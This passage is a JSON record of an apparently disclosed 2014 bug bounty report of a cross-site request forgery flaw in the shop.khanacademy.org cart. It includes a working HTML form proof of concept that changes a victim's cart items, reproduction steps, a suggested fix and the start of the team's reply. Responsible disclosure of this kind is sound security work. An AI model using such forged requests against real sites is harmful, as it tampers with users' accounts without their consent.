_agreed_on_going_public_at":"2014-04-14T22:01:31.880Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there,\r\n\r\nI've discovered a possiblity to remove/add items to a users' cart at shop.khanacademy.org.\r\n\r\n###Details\r\n\r\n```\r\n- Host: shop.khanacademy.org\r\n- URL: http://shop.khanacademy.org/cart\r\n- Affected parameters: updates[PRODUCTID]\r\n```\r\n\r\n\r\n###Steps to reproduce\r\n- 1. Visit http://shop.khanacademy.org/cart and empty your cart\r\n- 2. Run the following CSRF PoC:\r\n\r\n```\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"http://shop.khanacademy.org/cart\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"updates\u0026#91;211669705\u0026#93;\" value=\"1\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"update\" value=\"Update\u0026#32;quantities\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\n- 3. Take a look into your cart again\r\n- 4. There should be a new item. \r\n\r\nAn attacker can set the quantity to zero to remove an item or increase / add new items to the cart. \r\n\r\n###How to fix?\r\nYou should add a CSRF token to the form. \r\n\r\nBest regards,\r\nSebastian Neef","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-05-08T03:22:44.823Z","allow_singular_disclosure_after":-234445881.57109562,"singular_disclosure_allowed":true,"vote_count":1,"voters":["cryptographer"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":26136,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for reporting. This is hosted by a third party and isn't high importance to us